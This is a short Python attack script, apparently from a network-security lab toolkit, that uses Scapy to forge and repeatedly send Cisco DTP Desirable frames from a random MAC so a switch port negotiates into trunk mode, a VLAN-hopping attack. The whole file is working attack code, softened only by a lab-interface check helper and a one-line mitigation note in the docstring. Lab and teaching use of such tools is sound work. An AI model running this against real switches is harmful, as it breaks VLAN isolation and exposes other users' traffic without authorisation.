#!/usr/bin/env python3
"""VLAN: forge DTP Desirable frames to negotiate the attached port into trunk
mode, exposing every VLAN on it. Mitigation: switchport nonegotiate."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import base_parser, enforce_lab_iface, require_scapy, status, run_loop, selftest_ok  # noqa: E402


def build_dtp(scapy_all, my_mac):
    import scapy.contrib.dtp as dtp
    Dot3, LLC, SNAP = scapy_all.Dot3, scapy_all.LLC, scapy_all.SNAP
    return (Dot3(src=my_mac, dst="01:00:0c:cc:cc:cc") / LLC() / SNAP() /
            dtp.DTP(tlvlist=[dtp.DTPDomain(), dtp.DTPStatus(), dtp.DTPType(),
                              dtp.DTPNeighbor(neighbor=my_mac)]))


def main():
    p = base_parser("DTP trunk negotiation hop (forge Desirable frames)")
    args = p.parse_args()
    enforce_lab_iface(args.iface)
    require_scapy()
    import scapy.all as scapy_all
    from scapy.volatile import RandMAC

    my_mac = str(RandMAC())
    pkt = build_dtp(scapy_all, my_mac)
    if args.selftest:
        selftest_ok("dtp_hop", "DTP frame len=%d" % len(bytes(pkt)))
        return

    def send(n):
        scapy_all.sendp(build_dtp(scapy_all, my_mac), iface=args.iface, verbose=0)
        status("SENT", "DTP Desirable #%d from %s" % (n + 1, my_mac))

    run_loop(args.count, args.interval, send)


if __name__ == "__main__":
    main()

